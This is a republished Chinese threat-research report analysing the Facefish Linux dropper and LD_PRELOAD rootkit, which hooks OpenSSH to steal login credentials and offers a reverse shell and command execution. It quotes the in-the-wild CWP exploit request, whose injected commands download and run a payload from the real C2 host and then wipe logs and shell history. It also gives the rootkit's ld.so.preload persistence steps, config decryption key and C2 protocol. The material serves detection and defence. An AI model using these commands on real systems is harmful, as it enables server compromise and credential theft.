@@ -1,0 +1,449 @@
+# 窃密者Facefish分析报告
+
+阅读量 **291693**
+
+发布时间 : 2021-06-03 18:00:38
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p2.ssl.qhimg.com/t0131108142e39af8ac.jpg)
+
+## 背景介绍
+
+2021年2月，我们捕获了一个通过CWP的Nday漏洞传播的未知ELF样本，简单分析后发现这是一个新botnet家族的样本。它针对Linux
+x64系统，配置灵活，并且使用了一个基于Diffie–Hellman和Blowfish的私有加密协议。但因为通过合作机构（在中国区有较好网络通信观察视野）验证后发现对应的C2通信命中为0，所以未再深入分析。
+
+2021年4月26号，Juniper发布了关于此样本的[分析报告](https://blogs.juniper.net/en-us/threat-research/linux-servers-hijacked-to-implant-ssh-backdoor)，我们注意到报告中忽略了一些重要的技术细节，所以决定将漏掉的细节分享出来。
+
+该家族的入口ELF样本MD5=38fb322cc6d09a6ab85784ede56bc5a7是一个Dropper，它会释放出一个Rootkit。因为Juniper并未为样本定义家族名，鉴于Dropper在不同的时间点释放的Rootkit有不同的MD5值，犹如川剧中的变脸，并且该家族使用了Blowfish加密算法，我们将它命名为Facefish。
+
+## Facefish概览
+
+Facefish由Dropper和Rootkit
+2部分组成，主要功能由Rootkit模块决定。Rootkit工作在Ring3层，利用LD_PRELOAD特性加载，通过Hook
+ssh/sshd程序的相关函数以窃取用户的登录凭证，同时它还支持一些后门功能。因此可以将Facefish定性为，一款针对Linux平台的窃密后门。
+
+Facefish的主要功能有
+
+  * 上报设备信息
+  * 窃取用户凭证
+  * 反弹Shell
+  * 执行任意命令
+
+基本流程如下图所示：
+
+![](https://blog.netlab.360.com/content/images/2021/05/fish_brief.png)
+
+## 传播方式
+
+在野利用的漏洞如下所示
+
+    
+    
+    POST /admin/index.php?scripts=.%00./.%00./client/include/inc_index&service_start=;cd%20/usr/bin;%20/usr/bin/wget%20http://176.111.174.26/76523y4gjhasd6/sshins;%20chmod%200777%20/usr/bin/sshins;%20ls%20-al%20/usr/bin/sshins;%20./sshins;%20cat%20/etc/ld.so.preload;%20rm%20-rf%20/usr/bin/sshins;%20sed%20-i%20'/sshins/d'%20/usr/local/cwpsrv/logs/access_log;%20history%20-c;&owner=root&override=1&api_key=%00%00%C2%90 HTTP/1.1
+    Host: xxx.xx.xx.xx:2031
+    User-Agent: python-requests/2.25.1
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Connection: keep-alive
+    Content-Length: 0
+    
+    
+
+将与Facefish相关部分转码后，得到以下执行命令序列，可以看出主要功能为下载执行第一阶段的payload，然后清理痕迹。
+
+    
+    
+    cd /usr/bin; 
+    /usr/bin/wget <http://176.111.174.26/76523y4gjhasd6/sshins>; 
+    chmod 0777 /usr/bin/sshins; 
+    ls -al /usr/bin/sshins; ./sshins; 
+    cat /etc/ld.so.preload;
+    rm -rf /usr/bin/sshins; 
+    sed -i '/sshins/d' /usr/local/cwpsrv/logs/access_log; 
+    history -c
+    
+
+## 逆向分析
+
+简单来说，Facefish的感染程序可以分成3个阶段，
+
+Stage 0: 预备阶段，通过漏洞传播，在设备上植入Dropper
+
+Stage 1: 释放阶段，Dropper释放出Rootkit
+
+Stage 2:业务阶段，Rootkit 收集回传敏感信息，等待执行C2下发的指令
+
+下文将从Stage 1到Stage 2着手，分析Facefish的各个阶段的技术细节。
+
+### Stage 1:Dropper分析
+
+Dropper的基体信息如下所示，主要功能为检测运行环境，解密存有C2信息的Config， 配置Rootkit，最后释放并启动Rootkit。
+
+> MD5:38fb322cc6d09a6ab85784ede56bc5a7
+>
+> ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked,
+> stripped
+>
+> Packer: UPX
+
+另处值得一提的是，Drooper在二进制层面，采用了一些tricks来对抗杀软的查杀。
+
+### Trick 1:upx with overlay
+
+如下图所示，将加密的Config数据作为overlay，填充到upx加壳后的样本尾部。
+
+![](https://blog.netlab.360.com/content/images/2021/03/fish_upxoverlay.png)
+
+这种做法的目的有2个:
+
+  1. 对抗upx脱壳
+  2. Config数据与样本解耦，可以通过工具更新Config，无需再编译源码，方便在黑市流通
+
+### Trick 2:elf without sections
+
+如下图所示，脱壳后样本中的section信息被抹除了
+
+![](https://blog.netlab.360.com/content/images/2021/03/fish_section.png)
+
+这种做法的目的有2个:
+
+  1. 某些依赖section的信息进行分析的工具无法正常工作，抹除section在一定程度上加大了分析难度
+  2. 某些杀毒引擎依赖section信息生成特征的的检测区，抹除section在一定程度上实现了免杀
+
+### Dropper主要功能
+
+Dropper运行时会输出下图中的信息：
+
+![](https://blog.netlab.360.com/content/images/2021/03/fish_proc.png)
+
+根据这个信息，我们将Dropper的功能分成了以下4个阶段
+
+  1. 检测运行环境
+  2. 解密Config
+  3. 配置Rootkit
+  4. 释放并启动Rootkit
+
+**0x1:检测运行环境**
+
+首先读取/bin/cat的前16个字节，通过判断第5个字节(EI_CLASS)的值来判断当前系统的位数,目前Facefish只支持x64系统。然后检查自身否在root权限下运行，最后尝试从自身文件尾部
+读入Config信息。其中任一环节失败，Facefish都将放弃感染，直接退出。
+
+![](https://blog.netlab.360.com/content/images/2021/03/fish_env.png)
+
+**0x2:解密Config**
+
+原始的Config信息长度为128字节，采用Blowfish算法的CBC模式加密，以overlay的形式储存在文件尾部。其中Blowfish的解密key&iv如下：
+
+  * key:buil
+  * iv:00 00 00 00 00 00 00 00
+
+值得一提的是在使用Blowfish时，其作者在编码过程中，玩了一个小trick来“恶心”安全研究人员，以下图代码片段为例：
+
+![](https://blog.netlab.360.com/content/images/2021/03/fish_blow.png)
+
+第一眼看上去，会让人以为Blowfish的密钥为”build”。注意第3个参数为4，即密钥的长度为4字节，所以真实的密钥为”buil”。
+
+以原始的Config为例，
+
+    
+    
+    BD E8 3F 94 57 A4 82 94 E3 B6 E9 9C B7 91 BC 59
+    5B B2 7E 74 2D 2E 2D 9B 94 F6 E5 3A 51 C7 D8 56
+    E4 EF A8 81 AC EB A6 DF 8B 7E DB 5F 25 53 62 E2
+    00 A1 69 BB 42 08 34 03 46 AF A5 7B B7 50 97 69
+    EB B2 2E 78 68 13 FA 5B 41 37 B6 D0 FB FA DA E1
+    A0 9E 6E 5B 5B 89 B7 64 E8 58 B1 79 2F F5 0C FF
+    71 64 1A CB BB E9 10 1A A6 AC 68 AF 4D AD 67 D1
+    BA A1 F3 E6 87 46 09 05 19 72 94 63 9F 50 05 B7
+    
+
+解密后的Config如下所示，可以看到其中的c2:port信息（176.111.174.26:443）。
+
+![](https://blog.netlab.360.com/content/images/2021/03/fish_dec.png)
+
+各字段具体的含义如下:
+
+OFFSET | LENGTH | MEANING  
+---|---|---  
+0x00 | 4 | magic  
+0x0c | 4 | interval  
+0x10 | 4 | offset of c2  
+0x14 | 4 | port  
+0x20(pointed by 0x10) |  | c2  
+  
+解密完成后，通过以下代码片段对Config进行校验，校验方法比较简单，即比较magic值是不是0xCAFEBABE，当校验通过后，进入配置Rootkit阶段。
+
+![](https://blog.netlab.360.com/content/images/2021/03/fish_check.png)
+
+**0x3:配置Rootkit**
+
+首先以当前时间为种子随机生成16个字节做为新的Blowfish的加密key，将上阶段的解密得到的Config使用新的key重新加密。
+
+![](https://blog.netlab.360.com/content/images/2021/03/fish_newkey.png)
+
+然后利用标志0xCAFEBABEDEADBEEF定位Dropper中的Rootkit的特定位置，写入新的加密key以及重新加密后的Config信息。
+
+![](https://blog.netlab.360.com/content/images/2021/03/fish_confroot.png)
+
+文件的变化如下所示：  
+写入之前：
+
+![](https://blog.netlab.360.com/content/images/2021/03/fish_emconf.png)
+
+写入之后：
+
+![](https://blog.netlab.360.com/content/images/2021/03/fish_newconf.png)
+
+在这个过程中因为加密key是随机生成的，所以不同时间释放的Rootkit的MD5值是不一样的，我们推测，这种设计是用来对抗杀软黑白HASH检测。
+
+![](https://blog.netlab.360.com/content/images/2021/03/fish_rodiff.png)
+
+另外值得一提的是，Facefish专门对FreeBSD操作系统做了支持。实现方法比较简单，如下图所示，即通过判断cat二进制中的EI_OSABI是否等于9，如果是则把Rootkit中的EI_OSABI值修改成9。
+
+![](https://blog.netlab.360.com/content/images/2021/05/fish_freebsd.png)
+
+**0x4:释放并启动Rootkit**
+
+将上阶段配置好的的Rootkit写到 /lib64/libs.so文件中，同时向/etc/ld.so.preload写入以下内容实现Rootkit的预加载。
+
+    
+    
+     /lib64/libs.so
+    
+
+通过以下命令重起ssh服务，让Rootkit有机会加载到sshd程序中
+
+    
+    
+    /etc/init.d/sshd restart
+    /etc/rc.d/sshd restart
+    service ssh restart
+    systemctl restart ssh
+    systemctl restart sshd.service
+    
+
+实际效果如下所示：
+
+![](https://blog.netlab.360.com/content/images/2021/03/fish_mod.png)
+
+至此Dropper的任务完成，Rootkit开始工作。
+
+### Stage 2:Rootkit分析
+
+Facefish的Rootkit模块libs.so工作在Ring3层，通过LD_PRELOAD特性加载，它基本信息如下所示：
+
+> MD5:d6ece2d07aa6c0a9e752c65fbe4c4ac2
+>
+> ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked,
+> stripped
+
+在IDA中能看到它导出了3个函数，根据preload机制，当rootkit被加载时，它们会替代libc的同名函数，实现hook。
+
+![](https://blog.netlab.360.com/content/images/2021/05/face_export.png)
+
+init_proc函数，它的主要功能是hook ssh/sshd进程中的相关函数以窃取登录凭证。  
+bind函数，它的主要功能是上报设备信息，等待执行C2下发的指令。  
+start函数，它的主要功能是为网络通信中的密钥交换过程计算密钥。
+
+### .init_proc 函数分析
+
+.init_proc函数首先会解密Config，取得C2,PORT等相关信息，然后判断被注入的进程是否为SSH/SSHD，如果是则对处理凭证的相关函数进行HOOK，最终当ssh主动对处连接，或sshd被动收到外部连接时，Facefish在Hook函数的帮助下，窃取登录凭着并发送给C2。
+
+**0x1 寻找SSH**
+
+如果当前系统为FreeBSD则，通过dlopen函数获取link_map结构的地址，利用link_map可以遍历当前进程所加载的模块，进而找到SSH相关模块。
+
+![](https://blog.netlab.360.com/content/images/2021/05/fish_fmap.png)
+
+如果当前系统不是FreeBSD，则通过.got.plt 表的第2项，得到link_map的地址。
+
+![](https://blog.netlab.360.com/content/images/2021/05/fish_nmap.png)
+
+得到SSH相关模块后，接着判断模块是否为ssh/sshd，方法比较简单，即验证模块中是否有以下字串。通过这一点，可知Facefish事实上只攻击OpenSSH实现的client/server。
+
+    
+    
+    1:usage: ssh
+    2:OpenSSH_
+    
+
+**0x2 HOOK函数**
+
+首先，Facefish会查找hook的函数地址
+
+其中要hook的ssh函数如所示：
+
+![](https://blog.netlab.360.com/content/images/2021/05/fish_sshproc.png)
+
+要hook的sshd函数如下所示：
+
+![](https://blog.netlab.360.com/content/images/2021/05/fish_sshdproc.png)
+
+如果没有找到，则将函数名加上前缀Fssh_再找一次。如果还是没有找到，则通过函数中的字串间接定位到函数。最后通过以下代码片断实现Hook。
+
+![](https://blog.netlab.360.com/content/images/2021/05/fish_hook.png)
+
+实际中HOOK前后的对比如下所示：
+
+![](https://blog.netlab.360.com/content/images/2021/05/fish_comp.png)
+
+**0x3 窃取登录凭证**
+
+Facefish在Hook后的函数帮助下，窃取登录凭证，并上报给C2。
+
+![](https://blog.netlab.360.com/content/images/2021/05/fish_upinfo.png)
+
+上报的数据格式为%08x-%08x-%08x-%08x,%s,%s,%s,%s,%s，其中前32节节为加密的key，后面跟着账号，远程主机，密码等信息。
+
+实际中上报的信息如下所示：
+
+![](https://blog.netlab.360.com/content/images/2021/05/fish_pass.png)
+
+### bind 函数分析
+
+一旦用户通过ssh登录，将会触发bind函数接着执行一系列后门行为，具体分析如下：
+
+如果后门初始化正常，首先会fork后门子进程并进入连接C2的指令循环，父进程则通过syscall(0x68/0x31)调用真正的bind函数。
+
+**0x1: 主机行为**
+
+判断sshd父进程是否存在，如果父进程退出，则后门进程也退出。
+
+如果父进程存在开始收集主机信息，包括：CPU型号、Arch，内存大小、硬盘大小、ssh服务相关配置文件和凭证数据。
+
+CPU型号
+
+内存
+
+硬盘
+
+网络设备
+
+SSH服务相关
+
+**0x2: C2指令介绍**
+
+Facefish使用的通信协议及加密算法比较复杂，其中0x2XX开头的指令用来交换公钥，我们在下一小节进行详细分析。0x3XX开头的指令是真正的C2功能指令。这里先对C2的功能指令做简单说明。
+
+  * 发 0x305是否发送上线信息0x305，如果没有则收集信息并上报。
+
+  * 发0x300功能上报窃取的凭证信息
+  * 发0x301收集uname信息，组包并发送0x301，等待进一步指令。
+
+  * 收0x302接受指令0x302，反向shell。
+
+  * 收0x310接受指令0x310，执行任意的系统命令
+
+  * 发0x311发指令0x311，返回系统命令的执行结果
+  * 收0x312接受指令0x312，重新收集并上报主机信息。
+
+**0x3: 通信协议分析**
+
+Facefish的rootkit使用了一个自定义的加密协议进行C2通信，该协议使用DH
+[(Diffie–Hellman)](https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange)
+算法进行密钥协商，使用BlowFish对称加密算法进行数据加密。具体运行时，单次C2会话可以分为两个阶段，第一阶段对应密钥协商，第二阶段便是使用协商好的密钥进行C2加密通信。Facefish的每次C2会话只收取并解密一条C2指令，然后便会结束。不难看出，因为使用了DH和Blowfish算法，仅从流量数据入手是无法获取其C2通信内容的，而且这种一次一密的通信也不会留下用于精准识别的流量特征。
+
+一般来说使用DH协议框架通信最简便的方法是使用OpenSSL库，而Facefish的作者自己编码(或者使用了某些开源项目)实现了整个通信过程，因为没有引入第三方库所以代码体积非常精减。
+
+  * DH通信原理为了更好的理解Facefish的密钥交换代码，我们需要先简单了解一下DH通信原理。这里不讨论背后的数学原理，而是用一个简单的例子直接套公式描述通信过程。step 1. 甲生成一个随机数 a=4，选择一个素数 p=23，和一个底数 g=5，并计算出 公钥A:A= g^a%p = 5^4%23 = 4，然后将p，g，A同时发送给乙。 
+
+step 2. 乙收到上述信息后也生成一个随机数 b=3，使用同样的公式算出公钥B:B = g^b%p = 5^3%23 =
+10，然后将B发送给甲。同时乙计算出双方共享的机密值用于生成后续的Blowfish密钥: s = A^b%p = (g^a)^b%p = 18。
+
+step 3. 甲收到B后也可以计算出共享机密值：s = B^a%p = (g^b)^a%p = 18
+
+step 4. 甲乙双方基于共享机密s生成blowfish密钥，进行加密C2通信。
+
+实质上通过简单推导可以看出甲和乙计算s的公式是同一个 ：
+
+在整个算法中有一个关键的数学函数求幂取模 power(x, y) mod
+z，当x，y都很大的时候直接求解比较困难，所以就用到了[快速幂取模算法](https://oi-wiki.org/math/quick-pow/)。前文提到的start函数正是快速幂取模 binpow() 中的关键代码，
+
+  * 协议分析发包和收包使用相同的数据结构。 
+    
+          struct package{
+          struct header{
+              WORD payload_len;  //payload长度
+              WORD cmd; 		//指令编码
+              DWORD payload_crc; // payload crc校验值
+          } ;
+          struct header hd;
+          unsigned char payload[payload_len]; // 数据
+      }
+    
+
+以构造0x200指令数据包为例可以定义数据包如下：
+
+    
+        struct package pkg = {
+    	.hd.payload_len = 0;
+    	.hd.cmd = 0x200;
+    	.hd.payload_crc = 0;
+    	.payload = "";
+    }
+    
+    
+
+对照DH通信原理和流量数据我们分析通信协议：
+
+  1. bot首先发送指令0x200，payload数据为空。
+  2. C2回复了指令0x201，payload长度为24个字节，按小端转换成3个 64位的数值，分别对应step1中甲发送的3个关键数据，p=0x294414086a9df32a，g=0x13a6f8eb15b27aff, A=0x0d87179e844f3758。
+  3. 对应step2，bot在本地生成了一个随机数b，然后根据收到的p，g 生成B=0x0e27ddd4b848924c，通过指令0x202发送给C2。至此完成了共享机密的协商。
+
+  4. 对应step3，bot和C2通过公钥A和公钥B生成Blowfish密钥s和iv。其中iv是通过p和g异或得到的。
+
+  5. 有了iv 和 s 我们可以对通信数据进行加解密。真正的通信数据采用BlowFish算法加解密，和前文提到的配置文件加密的方法是一致的。bot向C2发送0x305指令，长度为0x1b0，内容是BlowFish加密后的上线包数据。解密后的上线包数据如下：
+
+## IOC
+
+Sample MD5
+
+    
+    
+    38fb322cc6d09a6ab85784ede56bc5a7 sshins
+    d6ece2d07aa6c0a9e752c65fbe4c4ac2 libs.so
+    
+
+C2
+
+    
+    
+    176.111.174.26:443
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **360网络安全研究院** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/243032](/post/id/243032)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [恶意软件](/tag/恶意软件)
+
+ **+1** __1赞
+
+ __收藏
+
+![](https://p5.ssl.qhmsg.com/dm/200_200_100/t00df551a583a87f4e9.jpg)
+360网络安全研究院
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
